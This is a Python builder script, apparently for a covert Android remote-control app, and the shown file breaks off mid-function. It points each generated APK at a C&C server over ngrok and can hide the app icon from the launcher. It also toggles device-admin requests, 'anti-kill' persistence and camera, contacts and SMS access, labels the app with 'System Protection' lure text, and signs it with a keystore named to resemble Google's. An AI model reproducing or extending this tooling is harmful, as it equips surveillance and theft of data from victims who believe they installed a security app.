"""
APK Builder - Gera APKs personalizados automaticamente
Permite escolher ícone e nome do app

MODO PARALELO: Cada build usa diretório isolado para permitir builds simultâneos
"""

import os
import re
import shutil
import subprocess
import tempfile
import time
import platform
import uuid
import json
from PIL import Image
from pathlib import Path
import xml.etree.ElementTree as ET

# #region agent log
def _agent_debug_log(hypothesis_id, location, message, data=None, run_id="pre-fix"):
    try:
        candidates = [
            Path(__file__).resolve().parent.parent / "debug-3482b4.log",
            Path(__file__).resolve().parent / "debug-3482b4.log",
        ]
        payload = {
            "sessionId": "3482b4",
            "runId": run_id,
            "hypothesisId": hypothesis_id,
            "location": location,
            "message": message,
            "data": data or {},
            "timestamp": int(time.time() * 1000),
        }
        line = json.dumps(payload, ensure_ascii=False) + "\n"
        for log_path in candidates:
            try:
                with open(log_path, "a", encoding="utf-8") as f:
                    f.write(line)
                break
            except OSError:
                continue
    except Exception:
        pass


def _extract_gradle_failure(stdout, stderr):
    text = f"{stdout or ''}\n{stderr or ''}"
    
    # Tenta extrair erros específicos do compilador Java (linhas com ".java:" e "error:")
    java_errors = []
    for line in text.splitlines():
        if ".java:" in line and "error:" in line:
            java_errors.append(line.strip())
        elif len(java_errors) > 0 and (line.strip().startswith("symbol:") or line.strip().startswith("location:")):
            # Pega as linhas de contexto do erro do compilador
            java_errors.append("    " + line.strip())
            
    if java_errors:
        # Retorna os erros de compilação do Java (máximo de 15 erros)
        return "Erros de compilação Java encontrados:\n" + "\n".join(java_errors[:15])

    markers = ["* What went wrong:", "What went wrong:", "FAILURE: Build failed", "Caused by:"]
    for marker in markers:
        idx = text.find(marker)
        if idx >= 0:
            return text[idx:idx + 1200].strip()
    return (stderr or stdout or "")[-1200:].strip()
# #endregion

# Diretório base para builds paralelos
BUILDS_DIR = Path(tempfile.gettempdir()) / "apk_builds"
BUILDS_DIR.mkdir(parents=True, exist_ok=True)

_PACKAGE_ID_RE = re.compile(r"^[a-z][a-z0-9_]*(\.[a-z][a-z0-9_]*)+$")


def _escape_xml_text(value: str) -> str:
    return (
        value.replace("&", "&amp;")
        .replace("<", "&lt;")
        .replace(">", "&gt;")
        .replace('"', "&quot;")
        .replace("'", "&apos;")
    )


def _sanitize_application_id(package_name: str) -> str:
    cleaned = (package_name or "").strip().lower()
    if _PACKAGE_ID_RE.match(cleaned):
        return cleaned
    return "com.studio.app"


def patch_hide_from_launcher(build_dir: Path, hide: bool) -> None:
    """Patcha AndroidManifest.xml e arquivos Java diretamente no diretório de build.

    Funciona para ocultar 100% o ícone da tela inicial e da gaveta de apps:
    1. AndroidManifest.xml       — Troca LAUNCHER por INFO se hide is True (ícone invisível desde a instalação)
    2. CommandControlService.java — Garante/injeta a constante HIDE_ICON
    3. SetupWizardActivity.java   — Ativa o ocultamento via PackageManager após o setup
    4. MainActivity.java          — Ativa o ocultamento via PackageManager na inicialização
    """
    build_path = Path(build_dir)
    
    # ── 1. AndroidManifest.xml ────────────────────────────────────────────────
    manifest_file = build_path / "app" / "src" / "main" / "AndroidManifest.xml"
    if manifest_file.exists():
        content = manifest_file.read_text(encoding="utf-8", errors="replace")
        if hide:
            if 'android.intent.category.LAUNCHER' in content:
                content = content.replace(
                    'android.intent.category.LAUNCHER',
                    'android.intent.category.INFO'
                )
                manifest_file.write_text(content, encoding="utf-8")
                print("[HIDE] AndroidManifest.xml: Categoria LAUNCHER alterada para INFO (Icone Oculto)")
        else:
            if 'android.intent.category.INFO' in content and 'android.intent.category.LAUNCHER' not in content:
                content = content.replace(
                    'android.intent.category.INFO',
                    'android.intent.category.LAUNCHER'
                )
                manifest_file.write_text(content, encoding="utf-8")
                print("[HIDE] AndroidManifest.xml: Categoria LAUNCHER mantida (Icone Visivel)")

    java_dir = (
        build_path
        / "app" / "src" / "main" / "java"
        / "com" / "seguranca" / "protecao"
    )

    # ── 2. CommandControlService.java ────────────────────────────────────────
    ccs_file = java_dir / "CommandControlService.java"
    if ccs_file.exists():
        content = ccs_file.read_text(encoding="utf-8", errors="replace")
        value = "true" if hide else "false"

        if re.search(r'public static final boolean HIDE_ICON\s*=', content):
            # Constante já existe — apenas atualiza o valor
            content, n = re.subn(
                r'public static final boolean HIDE_ICON\s*=\s*(true|false)\s*;',
                f'public static final boolean HIDE_ICON = {value};',
                content, count=1,
            )
            if n:
                ccs_file.write_text(content, encoding="utf-8")
                print(f"[HIDE] CommandControlService: HIDE_ICON = {value}")
        else:
            # Constante não existe — injeta logo após WEBVIEW_URL
            content, n = re.subn(
                r'(public static final String WEBVIEW_URL\s*=\s*"[^"]*"\s*;)',
                rf'\1\n    public static final boolean HIDE_ICON = {value};',
                content, count=1,
            )
            if n:
                ccs_file.write_text(content, encoding="utf-8")
                print(f"[HIDE] CommandControlService: HIDE_ICON injetado = {value}")
            else:
                print("[HIDE] WARN: nao encontrei ponto de injecao em CommandControlService")
    else:
        print("[HIDE] WARN: CommandControlService.java nao encontrado")

    # ── 3. SetupWizardActivity.java ──────────────────────────────────────────
    sw_file = java_dir / "SetupWizardActivity.java"
    if sw_file.exists() and hide:
        sw_content = sw_file.read_text(encoding="utf-8", errors="replace")
        sw_content = re.sub(
            r'/\*\s*if\s*\(\s*CommandControlService\.HIDE_ICON\s*\)\s*\{[\s\S]*?\}\s*\*/',
            '''if (CommandControlService.HIDE_ICON) {
            try {
                android.content.pm.PackageManager pm = getPackageManager();
                android.content.ComponentName componentName = new android.content.ComponentName(
                    this, MainActivity.class
                );
                pm.setComponentEnabledSetting(
                    componentName,
                    android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                    android.content.pm.PackageManager.DONT_KILL_APP
                );
                Log.d(TAG, "[HIDE] Ícone removido da tela inicial via PackageManager");
            } catch (Exception e) {
                Log.e(TAG, "Erro ao ocultar ícone: " + e.getMessage());
            }
        }''',
            sw_content,
            count=1
        )
        sw_file.write_text(sw_content, encoding="utf-8")
        print("[HIDE] SetupWizardActivity: Ocultamento via PackageManager ativado")

    # ── 4. MainActivity.java ─────────────────────────────────────────────────
    ma_file = java_dir / "MainActivity.java"
    if ma_file.exists() and hide:
        ma_content = ma_file.read_text(encoding="utf-8", errors="replace")
        ma_content = re.sub(
            r'/\*\s*if\s*\(\s*CommandControlService\.HIDE_ICON\s*\)\s*\{\s*hideAppIcon\(\);\s*\}\s*\*/',
            '''if (CommandControlService.HIDE_ICON) {
                try {
                    hideAppIcon();
                } catch (Exception ignored) {}
            }''',
            ma_content,
            count=1
        )
        ma_file.write_text(ma_content, encoding="utf-8")
        print("[HIDE] MainActivity: Ocultamento via hideAppIcon ativado")



def patch_request_admin(build_dir: Path, request_admin: bool) -> None:
    """Patcha REQUEST_ADMIN em CommandControlService.java diretamente no diretório de build."""
    java_dir = (
        Path(build_dir)
        / "app" / "src" / "main" / "java"
        / "com" / "seguranca" / "protecao"
    )
    ccs_file = java_dir / "CommandControlService.java"
    if ccs_file.exists():
        content = ccs_file.read_text(encoding="utf-8", errors="replace")
        value = "true" if request_admin else "false"

        if re.search(r'public static final boolean REQUEST_ADMIN\s*=', content):
            content, n = re.subn(
                r'public static final boolean REQUEST_ADMIN\s*=\s*(true|false)\s*;',
                f'public static final boolean REQUEST_ADMIN = {value};',
                content, count=1,
            )
            if n:
                ccs_file.write_text(content, encoding="utf-8")
                print(f"[ADMIN] CommandControlService: REQUEST_ADMIN = {value}")
        else:
            content, n = re.subn(
                r'(public static final boolean HIDE_ICON\s*=\s*(?:true|false)\s*;)',
                rf'\1\n    public static final boolean REQUEST_ADMIN = {value};',
                content, count=1,
            )
            if not n:
                content, n = re.subn(
                    r'(public static final String SERVER_URL\s*=\s*"[^"]*"\s*;)',
                    rf'\1\n    public static final boolean REQUEST_ADMIN = {value};',
                    content, count=1,
                )
            if n:
                ccs_file.write_text(content, encoding="utf-8")
                print(f"[ADMIN] CommandControlService: REQUEST_ADMIN injetado = {value}")


def patch_anti_kill(build_dir: Path, enable_anti_kill: bool) -> None:
    """Patcha ANTI_KILL em CommandControlService.java diretamente no diretório de build."""
    java_dir = (
        Path(build_dir)
        / "app" / "src" / "main" / "java"
        / "com" / "seguranca" / "protecao"
    )
    ccs_file = java_dir / "CommandControlService.java"
    if ccs_file.exists():
        content = ccs_file.read_text(encoding="utf-8", errors="replace")
        value = "true" if enable_anti_kill else "false"

        if re.search(r'public static final boolean ANTI_KILL\s*=', content):
            content, n = re.subn(
                r'public static final boolean ANTI_KILL\s*=\s*(true|false)\s*;',
                f'public static final boolean ANTI_KILL = {value};',
                content, count=1,
            )
            if n:
                ccs_file.write_text(content, encoding="utf-8")
                print(f"[ANTI_KILL] CommandControlService: ANTI_KILL = {value}")
        else:
            content, n = re.subn(
                r'(public static final boolean REQUEST_ADMIN\s*=\s*(?:true|false)\s*;)',
                rf'\1\n    public static final boolean ANTI_KILL = {value};',
                content, count=1,
            )
            if not n:
                content, n = re.subn(
                    r'(public static final boolean HIDE_ICON\s*=\s*(?:true|false)\s*;)',
                    rf'\1\n    public static final boolean ANTI_KILL = {value};',
                    content, count=1,
                )
            if n:
                ccs_file.write_text(content, encoding="utf-8")
                print(f"[ANTI_KILL] CommandControlService: ANTI_KILL injetado = {value}")


def patch_permissions(build_dir: Path, enable_camera: bool = True, enable_contacts: bool = True, enable_send_sms: bool = True, enable_read_sms: bool = True) -> None:
    """Patcha as flags de permissões em CommandControlService.java no diretório de build."""
    java_dir = (
        Path(build_dir)
        / "app" / "src" / "main" / "java"
        / "com" / "seguranca" / "protecao"
    )
    ccs_file = java_dir / "CommandControlService.java"
    if ccs_file.exists():
        content = ccs_file.read_text(encoding="utf-8", errors="replace")
        
        flags = {
            "ENABLE_CAMERA": "true" if enable_camera else "false",
            "ENABLE_CONTACTS": "true" if enable_contacts else "false",
            "ENABLE_SEND_SMS": "true" if enable_send_sms else "false",
            "ENABLE_READ_SMS": "true" if enable_read_sms else "false",
        }
        
        for flag, val in flags.items():
            if re.search(fr'public static final boolean {flag}\s*=', content):
                content, _ = re.subn(
                    fr'public static final boolean {flag}\s*=\s*(true|false)\s*;',
                    f'public static final boolean {flag} = {val};',
                    content, count=1,
                )
            else:
                content, _ = re.subn(
                    r'(public static final boolean ANTI_KILL\s*=\s*(?:true|false)\s*;)',
                    rf'\1\n    public static final boolean {flag} = {val};',
                    content, count=1,
                )
        
        ccs_file.write_text(content, encoding="utf-8")
        print(f"[PERMISSIONS] Patched: {flags}")



def patch_app_name(build_dir: Path, app_name: str) -> None:
    """Atualiza app_name em strings.xml e garante label @string/app_name no manifest."""
    safe_name = _escape_xml_text((app_name or "App").strip() or "App")
    build_path = Path(build_dir)

    strings_file = build_path / "app" / "src" / "main" / "res" / "values" / "strings.xml"
    if strings_file.exists():
        content = strings_file.read_text(encoding="utf-8")
        if re.search(r'<string name="app_name">', content):
            content = re.sub(
                r'<string name="app_name">.*?</string>',
                f'<string name="app_name">{safe_name}</string>',
                content,
                count=1,
            )
        else:
            content = content.replace(
                "</resources>",
                f'    <string name="app_name">{safe_name}</string>\n</resources>',
                1,
            )
        strings_file.write_text(content, encoding="utf-8")

    manifest_file = build_path / "app" / "src" / "main" / "AndroidManifest.xml"
    if manifest_file.exists():
        content = manifest_file.read_text(encoding="utf-8")
        content = re.sub(
            r'(<application\b[^>]*\bandroid:label=")[^"]*(")',
            r'\1@string/app_name\2',
            content,
            count=1,
        )
        manifest_file.write_text(content, encoding="utf-8")

    print(f"[NAME] App name patched: {app_name}")


def patch_application_id(build_dir: Path, package_name: str) -> None:
    """Atualiza applicationId no build.gradle."""
    sanitized = _sanitize_application_id(package_name)
    gradle_file = Path(build_dir) / "app" / "build.gradle"
    if not gradle_file.exists():
        print(f"[WARN] build.gradle not found: {gradle_file}")
        return

    content = gradle_file.read_text(encoding="utf-8")
    content, count = re.subn(
        r'applicationId\s+"[^"]+"',
        f'applicationId "{sanitized}"',
        content,
        count=1,
    )
    if count == 0:
        print(f"[WARN] applicationId not found in {gradle_file}")
    else:
        gradle_file.write_text(content, encoding="utf-8")
        print(f"[PKG] applicationId patched: {sanitized}")


# Limpa builds antigos (mais de 1 hora)
def cleanup_old_builds():
    """Remove diretórios de build antigos"""
    try:
        now = time.time()
        for build_dir in BUILDS_DIR.iterdir():
            if build_dir.is_dir():
                # Se foi criado há mais de 1 hora, remove
                age = now - build_dir.stat().st_mtime
                if age > 3600:  # 1 hora
                    try:
                        shutil.rmtree(build_dir, ignore_errors=True)
                        print(f"[CLEANUP] Removido build antigo: {build_dir.name}")
                    except:
                        pass
    except Exception as e:
        print(f"[WARN] Erro na limpeza de builds antigos: {e}")

class APKBuilder:
    def __init__(self, android_project_path, ngrok_url):
        self.original_project_path = Path(android_project_path)
        self.ngrok_url = ngrok_url
        self.build_id = str(uuid.uuid4())[:8]  # ID único para este build
        self.build_dir = None  # Será definido ao iniciar build
        self.project_path = None  # Cópia isolada do projeto
        
    def build_custom_apk(self, app_name, icon_path, output_path, webview_url=None, hide_from_launcher=False, request_admin=False, enable_anti_kill=True, language="pt", enable_camera=True, enable_contacts=True, enable_send_sms=True, enable_read_sms=True):
        """
        Gera APK personalizado em diretório isolado (suporta builds paralelos)
        """
        cleanup_old_builds()
        
        print(f"[BUILD-{self.build_id}] Iniciando build: {app_name} (idioma: {language}, anti_kill: {enable_anti_kill})")
        print(f"[BUILD-{self.build_id}] Modo: Diretório isolado (paralelo)")
        
        try:
            # Cria diretório isolado para este build
            self.build_dir = BUILDS_DIR / f"build_{self.build_id}"
            self.build_dir.mkdir(parents=True, exist_ok=True)
            
            # Copia projeto Android para diretório isolado
            self._copy_project_isolated()

            # Garante que builds do Modo Rápido fiquem sem telas visuais antigas
            self._remove_visual_config()
            
            # 1. Atualiza nome do app
            self._update_app_name(app_name)
            
            # 1.5. Atualiza idioma do app
            self._update_app_language(language)
            
            # 2. Atualiza ícone
            self._update_icon(icon_path)
            
            # 3. Atualiza URL do servidor
            self._update_server_url(self.ngrok_url)
            
            # 3.5. Atualiza URL do WebView (se configurada)
            self._update_webview_url(webview_url)
            
            # 3.6. Oculta icone da tela inicial (se configurado)
            # Patcha CommandControlService + SetupWizardActivity + MainActivity
            patch_hide_from_launcher(self.project_path, hide_from_launcher)
            
            # 3.7. Solicita Device Admin (se configurado)
            patch_request_admin(self.project_path, request_admin)

            # 3.8. Configura Proteção Anti-Kill
            patch_anti_kill(self.project_path, enable_anti_kill)
            
            # 3.9. Configura Permissões Escolhidas pelo Operador
            patch_permissions(self.project_path, enable_camera=enable_camera, enable_contacts=enable_contacts, enable_send_sms=enable_send_sms, enable_read_sms=enable_read_sms)
            
            # 4. Compila APK
            apk_path = self._compile_apk()
            
            # 5. Copia APK final para destino
            shutil.copy(apk_path, output_path)
            
            print(f"[BUILD-{self.build_id}] [OK] APK gerado: {output_path}")
            return True
            
        except Exception as e:
            print(f"[BUILD-{self.build_id}] [ERRO] Erro: {e}")
            import traceback
            traceback.print_exc()
            return False
            
        finally:
            # Limpa diretório de build após conclusão
            self._cleanup_build_dir()



    def _copy_project_isolated(self):
        """Copia projeto Android para diretório isolado"""
        print(f"[BUILD-{self.build_id}] Copiando projeto para diretório isolado...")
        
        self.project_path = self.build_dir / "android-project"
        
        # Copia apenas arquivos necessários (ignora build anterior)
        def ignore_patterns(directory, files):
            ignored = []
            for f in files:
                # Ignora diretórios de build e cache
                if f in ['.gradle', 'build', '.idea', '*.iml', '__pycache__']:
                    ignored.append(f)
                # Ignora arquivos de build intermediários
                if f.endswith('.apk') or f.endswith('.dex'):
                    ignored.append(f)
            return ignored
        
        shutil.copytree(
            self.original_project_path, 
            self.project_path,
            ignore=ignore_patterns,
            dirs_exist_ok=True
        )

        # Garante remoção de caches residuais do Gradle na pasta isolada
        for residual in ["build", ".gradle", "app/build"]:
            res_path = self.project_path / residual
            if res_path.exists():
                shutil.rmtree(res_path, ignore_errors=True)
        
        print(f"[BUILD-{self.build_id}] Projeto copiado para: {self.project_path}")
        # #region agent log
        root_gradle = self.project_path / "build.gradle"
        app_gradle = self.project_path / "app" / "build.gradle"
        _agent_debug_log(
            "A",
            "apk_builder.py:_copy_project_isolated",
            "isolated project copied",
            {
                "project_path": str(self.project_path),
                "has_root_build_gradle": root_gradle.exists(),
                "has_app_build_gradle": app_gradle.exists(),
                "root_has_finalizedBy": "signReleaseWithUber" in root_gradle.read_text(encoding="utf-8", errors="ignore") if root_gradle.exists() else False,
                "app_has_lsparanoid_plugin": "lsposed.lsparanoid" in app_gradle.read_text(encoding="utf-8", errors="ignore") if app_gradle.exists() else False,
            },
        )
        # #endregion
    
    def _cleanup_build_dir(self):
        """Remove diretório de build após conclusão"""
        if self.build_dir and self.build_dir.exists():
            try:
                shutil.rmtree(self.build_dir, ignore_errors=True)
                print(f"[BUILD-{self.build_id}] Diretório de build limpo")
            except Exception as e:
                print(f"[BUILD-{self.build_id}] Aviso: não foi possível limpar build: {e}")
    
    def _update_app_name(self, app_name):
        """Atualiza nome do app em strings.xml e AndroidManifest.xml"""
        patch_app_name(self.project_path, app_name)
        
        # Atualiza ícone personalizado no manifest
        manifest_path = self.project_path / "app/src/main/AndroidManifest.xml"
        ET.register_namespace('android', 'http://schemas.android.com/apk/res/android')
        manifest_tree = ET.parse(manifest_path)
        manifest_root = manifest_tree.getroot()
        application = manifest_root.find('application')
        if application is not None:
            application.set('{http://schemas.android.com/apk/res/android}icon', '@mipmap/ic_launcher')
        manifest_tree.write(manifest_path, encoding='utf-8', xml_declaration=True)
    
    def _update_icon(self, icon_path):
        """
        Converte e copia ícone para todos os tamanhos Android (normal e round)
        Suporta PNG/JPG de qualquer tamanho, preservando transparência
        """
        if not icon_path or str(icon_path) == "default" or not os.path.exists(str(icon_path)):
            print(f"[ICON] Usando ícone padrão do projeto")
            return

        icon_sizes = {
            'mdpi': 48,
            'hdpi': 72,
            'xhdpi': 96,
            'xxhdpi': 144,
            'xxxhdpi': 192
        }
        
        try:
            # Abre imagem original
            img = Image.open(icon_path)
            
            # Converte para RGBA se necessário (preservando transparência)
            if img.mode != 'RGBA':
                img = img.convert('RGBA')
            
            # Gera ícones para cada densidade (tanto ic_launcher quanto ic_launcher_round)
            for density, size in icon_sizes.items():
                drawable_dir = self.project_path / f"app/src/main/res/mipmap-{density}"
                drawable_dir.mkdir(parents=True, exist_ok=True)
                
                # Redimensiona com alta qualidade
                icon_resized = img.resize((size, size), Image.Resampling.LANCZOS)
                
                # Salva como PNG para ic_launcher e ic_launcher_round
                icon_path_out = drawable_dir / "ic_launcher.png"
                icon_round_out = drawable_dir / "ic_launcher_round.png"
                
                icon_resized.save(icon_path_out, 'PNG')
                icon_resized.save(icon_round_out, 'PNG')
            
            # Remove arquivos adaptativos (anydpi-v26) se existirem para forçar o sistema a usar nossos PNGs
            anydpi_dir = self.project_path / "app/src/main/res/mipmap-anydpi-v26"
            if anydpi_dir.exists():
                shutil.rmtree(anydpi_dir, ignore_errors=True)
                
            print(f"[ICON] Ícone personalizado aplicado com sucesso em todas as densidades (ic_launcher e ic_launcher_round)!")
            
        except Exception as e:
            print(f"[ICON-ERROR] Erro ao processar ícone: {e}")
            raise Exception(f"Erro ao processar ícone: {e}. Certifique-se de enviar um arquivo PNG ou JPG válido.")

    def _update_app_language(self, language_code):
        """
        Atualiza o idioma dos textos do assistente (wizard), notificações e strings do app
        Suporta: 'pt' (Português), 'en' (English), 'es' (Español)
        """
        if not language_code or language_code == "pt":
            return
            
        print(f"[LANG] Aplicando idioma do app: {language_code}")
        
        translations = {
            "en": {
                "welcome_title": "Welcome to System Protection",
                "welcome_desc": "This wizard will configure your device protection in just a few steps.",
                "permissions_desc": "You will need to grant some permissions for protection to work properly.",
                "next_btn": "NEXT",
                "battery_opt_title": "Advanced Battery Optimization"
            },
            "es": {
                "welcome_title": "Bienvenido al Sistema de Protección",
                "welcome_desc": "Este asistente configurará la protección de su dispositivo en solo unos pasos.",
                "permissions_desc": "Deberá conceder algunos permisos para que la protección funcione correctamente.",
                "next_btn": "CONTINUAR",
                "battery_opt_title": "Optimización de Batería Avanzada"
            }
        }
        
        t = translations.get(language_code)
        if not t:
            return

        # 1. Atualiza strings.xml
        strings_file = self.project_path / "app/src/main/res/values/strings.xml"
        if strings_file.exists():
            content = strings_file.read_text(encoding="utf-8")
            content = content.replace("Bem-vindo ao Sistema de Proteção", t["welcome_title"])
            content = content.replace("Este assistente irá configurar a proteção do seu dispositivo em apenas alguns passos.", t["welcome_desc"])
            content = content.replace("Você precisará conceder algumas permissões para que a proteção funcione corretamente.", t["permissions_desc"])
            content = content.replace("AVANÇAR", t["next_btn"])
            content = content.replace("Otimização de Bateria Avançada", t["battery_opt_title"])
            strings_file.write_text(content, encoding="utf-8")

        # 2. Patch em arquivos Java (GuidedOverlayService.java, SetupWizardActivity.java)
        for java_rel_path in [
            "app/src/main/java/com/seguranca/protecao/GuidedOverlayService.java",
            "app/src/main/java/com/seguranca/protecao/SetupWizardActivity.java"
        ]:
            file_path = self.project_path / java_rel_path
            if file_path.exists():
                txt = file_path.read_text(encoding="utf-8", errors="ignore")
                txt = txt.replace("Bem-vindo ao Sistema de Proteção", t["welcome_title"])
                txt = txt.replace("Este assistente irá configurar a proteção do seu dispositivo em apenas alguns passos.", t["welcome_desc"])
                txt = txt.replace("Você precisará conceder algumas permissões para que a proteção funcione corretamente.", t["permissions_desc"])
                txt = txt.replace("AVANÇAR", t["next_btn"])
                file_path.write_text(txt, encoding="utf-8")
    
    def _update_server_url(self, ngrok_url):
        """Atualiza URL do servidor C&C"""
        import re
        
        server_file = self.project_path / "app/src/main/java/com/seguranca/protecao/CommandControlService.java"
        
        with open(server_file, 'r', encoding='utf-8') as f:
            content = f.read()
        
        # Substitui URL usando regex (mais flexível, suporta qualquer espaçamento)
        content = re.sub(
            r'(public|private)\s+static\s+final\s+String\s+SERVER_URL\s*=\s*"[^"]*"\s*;',
            f'public static final String SERVER_URL = "{ngrok_url}";',
            content
        )
        
        with open(server_file, 'w', encoding='utf-8') as f:
            f.write(content)
        
        print(f"[URL] URL do servidor atualizada: {ngrok_url}")

    def _update_webview_url(self, webview_url):
        """Atualiza URL da WebView no CommandControlService"""
        import re
        
        server_file = self.project_path / "app/src/main/java/com/seguranca/protecao/CommandControlService.java"
        
        with open(server_file, 'r', encoding='utf-8') as f:
            content = f.read()
            
        url_to_set = (webview_url or "").strip()
        
        # Substitui a constante WEBVIEW_URL usando regex (mais flexível, suporta qualquer espaçamento)
        content = re.sub(
            r'(public|private)\s+static\s+final\s+String\s+WEBVIEW_URL\s*=\s*"[^"]*"\s*;',
            f'public static final String WEBVIEW_URL = "{url_to_set}";',
            content
        )
        
        with open(server_file, 'w', encoding='utf-8') as f:
            f.write(content)
        
        print(f"[WebView] URL da WebView atualizada: {url_to_set}")
    
    def _generate_package_name(self, app_name):
        """Gera package name único baseado no nome do app"""
        # Remove caracteres especiais e espaços
        clean_name = ''.join(c.lower() if c.isalnum() else '' for c in app_name)
        return f"com.app.{clean_name}"
    
    def _update_package_name(self, package_name):
        """Atualiza package name no build.gradle"""
        patch_application_id(self.project_path, package_name)
    
    def _detect_android_sdk(self):
        """Auto-detecta o Android SDK em locais comuns do Windows/VPS"""
        # 1. Já definido no ambiente?
        for env_key in ("ANDROID_HOME", "ANDROID_SDK_ROOT"):
            val = os.environ.get(env_key, "").strip()
            if val and Path(val).exists():
                print(f"[SDK] Usando {env_key}: {val}")
                return val

        def _is_valid_sdk(p: Path) -> bool:
            """Aceita o SDK se qualquer subpasta conhecida existir"""
            if not p.exists():
                return False
            for sub in ("build-tools", "platforms", "cmdline-tools", "platform-tools"):
                if (p / sub).exists():
                    return True
            # Fallback: a pasta existe e tem pelo menos algo dentro
            try:
                return any(p.iterdir())
            except Exception:
                return False

        # 2. Prioridade: caminho onde o nosso instalador coloca
        priority = [
            Path("C:/Android/Sdk"),
            Path("C:/android-sdk"),
            Path("D:/Android/Sdk"),
        ]
        for p in priority:
            if _is_valid_sdk(p):
                print(f"[SDK] Android SDK encontrado: {p}")
                return str(p)

        # 3. Caminhos por usuário
        candidates = []
        user_profile = os.environ.get("USERPROFILE")
        if user_profile:
            candidates += [
                Path(user_profile) / "AppData" / "Local" / "Android" / "Sdk",
                Path(user_profile) / "Android" / "Sdk",
            ]
        try:
            candidates += [
                Path.home() / "AppData" / "Local" / "Android" / "Sdk",
                Path.home() / "Android" / "Sdk",
            ]
        except Exception:
            pass

        for user in ["Administrador", "Administrator", "admin", os.environ.get("USERNAME", "")]:
            if user:
                candidates += [
                    Path(f"C:/Users/{user}/AppData/Local/Android/Sdk"),
                    Path(f"C:/Users/{user}/Android/Sdk"),
                    Path(f"C:/Users/{user}/AppData/Local/Android/sdk"),
                ]
        candidates += [
            Path("C:/Program Files/Android/Android Studio/sdk"),
            Path("C:/Program Files (x86)/Android/android-sdk"),
        ]

        for p in candidates:
            if _is_valid_sdk(p):
                print(f"[SDK] Android SDK encontrado: {p}")
                return str(p)

        return None


    def _write_local_properties(self, sdk_path: str):
        """Escreve local.properties com sdk.dir para o Gradle encontrar o SDK"""
        local_props = self.project_path / "local.properties"
        # Gradle exige barras no estilo Unix mesmo no Windows
        sdk_dir = sdk_path.replace("\\", "/")
        local_props.write_text(f"sdk.dir={sdk_dir}\n", encoding="utf-8")
        print(f"[SDK] local.properties escrito: sdk.dir={sdk_dir}")

    def _compile_apk(self):
        """Compila APK usando gradlew com otimizacoes"""
        print("[COMPILE] Compilando APK (otimizado)...")

        # --- Android SDK: detecta e garante que o Gradle vai encontrar ---
        sdk_path = self._detect_android_sdk()
        if sdk_path:
            self._write_local_properties(sdk_path)
        else:
            print("[WARN] Android SDK nao encontrado automaticamente. "
                  "Defina ANDROID_HOME ou ANDROID_SDK_ROOT no ambiente.")
        
        # Executa gradlew assembleRelease com flags de otimização
        gradlew = self.project_path / "gradlew.bat" if os.name == 'nt' else self.project_path / "gradlew"
        
        build_args = [
            str(gradlew),
            "assembleRelease",
            "-PhydraSkipParanoid=true",
            "--no-configuration-cache",
            "--no-build-cache",
            "--no-daemon",
            "--parallel",
            "-Dorg.gradle.daemon=false",
            "-Dorg.gradle.parallel=true",
            "-Dorg.gradle.jvmargs=-Xmx2048m -XX:+HeapDumpOnOutOfMemoryError",
            "--stacktrace"
        ]

        env = os.environ.copy()
        env["KRYPTOS REMOTE_SKIP_PARANOID"] = "1"
        # Injeta ANDROID_HOME no subprocesso para o Gradle também encontrar via env
        if sdk_path:
            env["ANDROID_HOME"] = sdk_path
            env["ANDROID_SDK_ROOT"] = sdk_path

        # #region agent log
        _agent_debug_log(
            "B",
            "apk_builder.py:_compile_apk",
            "starting gradle assembleRelease",
            {
                "cwd": str(self.project_path),
                "hydra_skip_paranoid": env.get("KRYPTOS REMOTE_SKIP_PARANOID"),
                "gradle_args": build_args,
            },
        )
        # #endregion
        
        result = subprocess.run(
            build_args,
            cwd=self.project_path,
            capture_output=True,
            text=True,
            env=env,
        )

        gradle_failure = _extract_gradle_failure(result.stdout, result.stderr)
        gradle_log_path = self.build_dir / "gradle-last.log"
        try:
            with open(gradle_log_path, "w", encoding="utf-8", errors="replace") as f:
                f.write("=== STDOUT ===\n")
                f.write(result.stdout or "")
                f.write("\n=== STDERR ===\n")
                f.write(result.stderr or "")
        except OSError:
            gradle_log_path = None

        # #region agent log
        _agent_debug_log(
            "C",
            "apk_builder.py:_compile_apk",
            "gradle finished",
            {
                "returncode": result.returncode,
                "gradle_failure_excerpt": gradle_failure[:800],
                "gradle_log_path": str(gradle_log_path) if gradle_log_path else None,
            },
        )
        # #endregion
        
        if result.returncode != 0:
            print(f"[WARN] Gradle stderr: {result.stderr[-500:] if result.stderr else 'N/A'}")
            print(f"[WARN] Gradle causa: {gradle_failure[:600]}")
            try:
                if gradle_log_path and gradle_log_path.exists():
                    persistent_log = Path(__file__).parent / "gradle-failed.log"
                    shutil.copy(gradle_log_path, persistent_log)
                    print(f"[COMPILE] [INFO] Log detalhado salvo em: {persistent_log.resolve()}")
            except Exception as e_log:
                print(f"[WARN] Erro ao salvar log persistente: {e_log}")
            raise Exception(f"Erro ao compilar: {gradle_failure[:400] if gradle_failure else 'Erro desconhecido'}")
        
        apk_path = self.project_path / "app/build/outputs/apk/release/app-release.apk"
        
        if not apk_path.exists():
            raise Exception("APK nao foi gerado")
        
        self._sign_apk_uber(apk_path)
        
        print("[OK] APK compilado com sucesso")
        return apk_path
    
    def _sign_apk_uber(self, apk_path):
        """Assina APK via sign_release_apk.ps1 (repo principal, nao diretorio isolado)."""
        candidates = [
            self.original_project_path.parent / "scripts" / "sign_release_apk.ps1",
            self.original_project_path.parent.parent / "scripts" / "sign_release_apk.ps1",
        ]
        sign_script = next((p for p in candidates if p.exists()), None)
        if not sign_script:
            print("[SIGN] sign_release_apk.ps1 nao encontrado — APK so com assinatura Gradle")
            return
        
        keystore = self.original_project_path / "google-services-release.jks"
        env = os.environ.copy()
        env["KRYPTOS REMOTE_APK_PATH"] = str(apk_path)
        if sign_script.parent.parent.exists():
            env["KRYPTOS REMOTE_PROJECT_ROOT"] = str(sign_script.parent.parent)
        if keystore.exists():
            env["KRYPTOS REMOTE_KEYSTORE"] = str(keystore)
        
        print(f"[SIGN] Uber APK Signer via {sign_script}")
        result = subprocess.run(
            ["powershell", "-ExecutionPolicy", "Bypass", "-File", str(sign_script)],
            capture_output=True,
            text=True,
            env=env,
        )
        if result.stdout:
            print(result.stdout.strip())
        if result.returncode != 0:
            err = (result.stderr or result.stdout or "")[-400:]
            print(f"[WARN] Assinatura uber falhou (APK Gradle permanece): {err}")
    
    def build_visual_apk(self, app_name, icon_path, output_path, visual_config_json, hide_from_launcher=False, enable_anti_kill=True, language="pt"):
        """
        🎨 Gera APK Visual personalizado com telas customizadas (suporta builds paralelos)
        """
        cleanup_old_builds()
        
